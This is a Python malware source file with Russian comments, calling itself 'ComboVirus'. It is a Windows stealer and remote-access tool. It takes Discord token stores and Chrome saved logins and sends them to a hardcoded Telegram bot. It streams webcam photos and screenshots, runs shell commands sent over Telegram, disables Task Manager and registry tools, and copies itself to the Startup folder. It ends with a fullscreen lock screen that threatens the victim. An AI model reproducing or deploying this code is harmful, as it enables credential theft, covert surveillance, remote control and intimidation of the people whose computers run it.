import os, sys, time, shutil, requests, tkinter as tk, psutil, winreg, threading, random, string, socket
import cv2, sqlite3, subprocess
import tempfile

# --- НАСТРОЙКИ БОТА ---
BOT_TOKEN = "9235115664:AAEnXrZR-m3UtZ4uBaBqPOwJnng2M__xsBc"
CHAT_ID = "8573437923"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
PASSWORD = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

# --- ОТПРАВКА В ТГ ---
def send_msg(text):
    try: requests.post(f"{API}/sendMessage", json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
    except: pass

def send_file(filepath, caption):
    try:
        with open(filepath, "rb") as f:
            requests.post(f"{API}/sendDocument", data={"chat_id": CHAT_ID, "caption": caption}, files={"document": f})
    except: pass

# --- СТИЛЕР (ПАРОЛИ И ТОКЕНЫ) ---
def steal_browsers():
    local = os.getenv("LOCALAPPDATA")
    appdata = os.getenv("APPDATA")
    
    # Discord
    discord_paths = [os.path.join(appdata, "discord", "Local Storage", "leveldb")]
    for path in discord_paths:
        if os.path.exists(path):
            temp_dir = tempfile.gettempdir()
            shutil.make_archive(os.path.join(temp_dir, "discord_tokens"), 'zip', path)
            send_file(os.path.join(temp_dir, "discord_tokens.zip"), "🎮 Discord Tokens")
            os.remove(os.path.join(temp_dir, "discord_tokens.zip"))

    # Chrome
    chrome_path = os.path.join(local, "Google", "Chrome", "User Data", "Default", "Login Data")
    if os.path.exists(chrome_path):
        temp_db = os.path.join(tempfile.gettempdir(), "chrome_logins.db")
        try:
            shutil.copy2(chrome_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            data = cursor.fetchall()
            if data:
                with open(os.path.join(tempfile.gettempdir(), "passwords.txt"), "w", encoding="utf-8") as f:
                    for row in data:
                        f.write(f"URL: {row[0]}\nLogin: {row[1]}\nPassword: {row[2]}\n\n")
                send_file(os.path.join(tempfile.gettempdir(), "passwords.txt"), "🔐 Chrome Passwords")
                os.remove(os.path.join(tempfile.gettempdir(), "passwords.txt"))
            conn.close()
            os.remove(temp_db)
        except: pass

# --- RAT (ВЕБКА И СКРИНЫ) ---
def spy_webcam():
    while True:
        try:
            cap = cv2.VideoCapture(0)
            if cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    p = os.path.join(tempfile.gettempdir(), "cam.jpg")
                    cv2.imwrite(p, frame)
                    cap.release()
                    requests.post(f"{API}/sendPhoto", data={"chat_id": CHAT_ID, "caption": "📸 Вебка"}, files={"photo": open(p, "rb")})
                    os.remove(p)
            time.sleep(20)
        except: pass

def spy_screen():
    import mss
    with mss.mss() as sct:
        while True:
            try:
                monitor = sct.monitors[1]
                sct_img = sct.grab(monitor)
                p = os.path.join(tempfile.gettempdir(), "screen.png")
                mss.tools.to_png(sct_img.rgb, sct_img.size, output=p)
                requests.post(f"{API}/sendPhoto", data={"chat_id": CHAT_ID, "caption": "🖥 Скриншот"}, files={"photo": open(p, "rb")})
                os.remove(p)
            except: pass
            time.sleep(30)

# --- УДАЛЕННЫЕ КОМАНДЫ ---
def check_commands():
    last_id = 0
    while True:
        try:
            res = requests.get(f"{API}/getUpdates?offset={last_id + 1}&timeout=10").json()
            if res.get("result"):
                for update in res["result"]:
                    last_id = update["update_id"]
                    if "message" in update and "text" in update["message"]:
                        cmd = update["message"]["text"]
                        if cmd.startswith("/cmd "):
                            out = subprocess.check_output(cmd[5:], shell=True, stderr=subprocess.STDOUT, timeout=10).decode('cp866', errors='ignore')
                            send_msg(f"🖥 `{cmd[5:]}`\n```\n{out[:3000]}\n```")
        except: pass
        time.sleep(3)

# --- БЛОКИРОВКА ЭКРАНА ---
def disable_tools():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except: pass

def show_window():
    root = tk.Tk()
    root.configure(bg="black")
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    tk.Label(root, text="🚨 СИСТЕМА ЗАБЛОКИРОВАНА 🚨\n\nЯ вижу тебя через вебку.", fg="red", bg="black", font=("Arial", 20)).pack(expand=True)
    root.mainloop()

if __name__ == "__main__":
    # Автозагрузка
    try:
        shutil.copy(sys.executable, os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup\sys_update.exe'))
    except: pass
    
    send_msg(f"🚨 **Жертва запустила ComboVirus!**\n💻 ПК: `{socket.gethostname()}`\n🔑 Пароль: `{PASSWORD}`")
    
    threading.Thread(target=steal_browsers, daemon=True).start()
    threading.Thread(target=spy_webcam, daemon=True).start()
    threading.Thread(target=spy_screen, daemon=True).start()
    threading.Thread(target=check_commands, daemon=True).start()
    
    disable_tools()
    show_window()
